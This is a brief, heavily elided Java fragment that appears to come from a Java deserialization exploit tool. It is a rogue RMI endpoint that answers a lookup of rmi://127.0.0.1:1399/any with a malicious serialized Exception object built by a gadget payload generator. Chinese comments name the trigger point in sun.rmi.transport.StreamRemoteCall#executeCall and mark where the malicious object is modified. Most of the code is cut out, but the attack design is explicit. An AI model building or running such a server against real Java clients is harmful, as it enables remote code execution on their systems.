...
import gadget.PayloadGenerator;
...
/**
 * lookup("rmi://127.0.0.1:1399/any")
 * 返回恶意 Exception 对象
 * 触发点 sun.rmi.transport.StreamRemoteCall#executeCall() case2
 */
@SuppressWarnings ( {
    "restriction"
} )
...
//        }
        ...
        // 这里修改恶意序列化对象
        final Object payloadObject = PayloadGenerator.getPayload();
